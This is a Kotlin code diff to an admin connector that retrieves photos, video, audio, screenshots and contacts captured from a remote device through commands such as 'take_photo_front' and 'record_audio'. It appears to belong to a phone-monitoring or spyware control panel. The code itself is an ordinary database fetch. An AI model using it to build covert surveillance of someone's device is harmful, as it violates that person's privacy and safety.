@@ -488,7 +488,7 @@ class SupabaseAdminConnector {
                         // Map the commands to our filterTypes
                         // filterType is "camera_photo", "video_record", "audio_record", "screenshot"
                         val isMatch = when(filterType) {
-                            "camera_photo" -> cmdType == "take_photo"
+                            "camera_photo" -> cmdType == "take_photo" || cmdType == "take_photo_front" || cmdType == "take_photo_back"
                             "video_record" -> cmdType == "record_video" || cmdType == "record_video_front" || cmdType == "record_video_back"
                             "audio_record" -> cmdType == "record_audio" || cmdType == "capture_audio"
                             "screenshot" -> cmdType == "take_screenshot" || cmdType == "screenshot"
@@ -525,6 +525,55 @@ class SupabaseAdminConnector {
     suspend fun getCameraPhotos(deviceToken: String) = getMediaRecords(deviceToken, "camera_photo")
     suspend fun getCameraVideos(deviceToken: String) = getMediaRecords(deviceToken, "video_record")
     suspend fun getAudioRecords(deviceToken: String) = getMediaRecords(deviceToken, "audio_record")
+
+    suspend fun getAllMediaFiles(deviceToken: String): List<MediaItem> = withContext(Dispatchers.IO) {
+        val list = mutableListOf<MediaItem>()
+        val request = Request.Builder()
+            .url("$rootUrl/rest/v1/media_files?token=eq.$deviceToken&order=created_at.desc")
+            .addSupabaseHeaders()
+            .get()
+            .build()
+        try {
+            client.newCall(request).execute().use { response ->
+                val bodyStr = response.body?.string() ?: return@withContext emptyList()
+                if (bodyStr.startsWith("[")) {
+                    val arr = JSONArray(bodyStr)
+                    for (i in 0 until arr.length()) {
+                        val obj = arr.optJSONObject(i) ?: continue
+                        val fileUrl = obj.optString("file_url").takeIf { it.isNotBlank() && it != "null" }
+                        val fileType = obj.optString("file_type")
+                        val commandSource = obj.optString("command_source")
+                        val createdStr = obj.optString("created_at")
+                        var ts = System.currentTimeMillis()
+                        if (createdStr.isNotBlank() && createdStr != "null") {
+                            try {
+                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                    val instant = java.time.Instant.parse(createdStr)
+                                    ts = instant.toEpochMilli()
+                                } else {
+                                    val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSSSSZ", java.util.Locale.US)
+                                    ts = sdf.parse(createdStr)?.time ?: System.currentTimeMillis()
+                                }
+                            } catch (e: Exception) {}
+                        }
+                        if (fileUrl != null) {
+                            list.add(MediaItem(
+                                id = obj.optString("id"),
+                                url = fileUrl,
+                                base64 = "",
+                                timestamp = ts,
+                                type = fileType,
+                                commandSource = commandSource
+                            ))
+                        }
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("SupabaseConnector", "Error fetching all media files", e)
+        }
+        return@withContext list
+    }
 
     suspend fun getContacts(deviceToken: String): List<Contact> = withContext(Dispatchers.IO) {
         val request = Request.Builder()
